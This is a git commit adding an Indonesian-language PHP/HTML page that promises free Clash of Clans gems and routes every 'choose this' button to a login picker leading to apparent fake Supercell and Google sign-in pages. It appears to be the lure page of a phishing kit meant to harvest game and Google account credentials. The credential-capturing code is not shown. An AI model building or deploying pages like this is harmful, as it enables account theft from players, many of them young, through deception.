9c29ef3ed755df860291f39be4317c51e1d8f59c
loothack <115432794+loothack@users.noreply.github.com>
2022-10-10 06:30:06 +0700

    Add files via upload

---
+++ event/gems/index.php
@@ -0,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Get COLLECT COC</title>
+    <link rel="shorcut icon" href="assets/img/favicon.png">
+    <link rel="stylesheet" type="text/css" href="../../assets/css/style.css">
+    <link rel="stylesheet" type="text/css" href="../../assets/css/animate.css">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,700|Open+Sans:300,300i,400,400i,700,700i" rel="stylesheet">
+    <script type="text/javascript" src="../../assets/js/main.js"></script>
+</head>
+<body>
+    <div id="bg">
+    </div>
+    <div class="idhaam69">
+        <div class="header">
+            <div class="header">
+                <img class="img-header" src="../../assets/img/logo.png" alt="Idhaam69">
+                <h2 class="bd">Kamu mau ambil berapa Gems? <br>Pilih dibawah</h2>
+            </div>
+        </div>
+        <div class="body">
+            <div class="box-body">
+                <img class="img-body kiri" src="../../assets/img/6.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+            <div class="box-body">
+                <img class="img-body kanan" src="../../assets/img/5.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+            <div class="box-body">
+                <img class="img-body kiri" src="../../assets/img/4.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+            <div class="box-body">
+                <img class="img-body kanan" src="../../assets/img/3.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+            <div class="box-body">
+                <img class="img-body kiri" src="../../assets/img/2.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+            <div class="box-body">
+                <img class="img-body kanan" src="../../assets/img/1.jpg" alt="Idhaam69">
+                <button onclick="setLogin()" class="btn-data">PILIH INI</button>
+            </div>
+        </div>
+    </div>
+    <div id="login">
+        <div class="login animated bounceInUp">
+            <div class="txt-login">Akun COC kamu login pake apa? Pilih Dibawah</div>
+            <div class="loglog">
+                <div class="setLogin kiri" onclick="location.href='../../login/supercell';">
+                    <img class="img-setLogin" src="../../assets/img/suplog.png" alt="Idhaam69">
+                    <span>Pake Supercell</span>
+                </div>
+                <div class="setLogin kanan" onclick="location.href='../../login/google';">
+                    <img class="img-setLogin google" src="../../assets/img/supglog.png" alt="Idhaam69">
+                    <span>Pake Google</span>
+                </div>
+            </div>
+            <hr>
+            <div class="txt-login">Salah pilih hadiah? Klik dibawah ini</div>
+            <button onclick="tutup()" class="tombolsetLogin">Kembali</button>
+        </div>
+    </div>
+</body>
+</html>
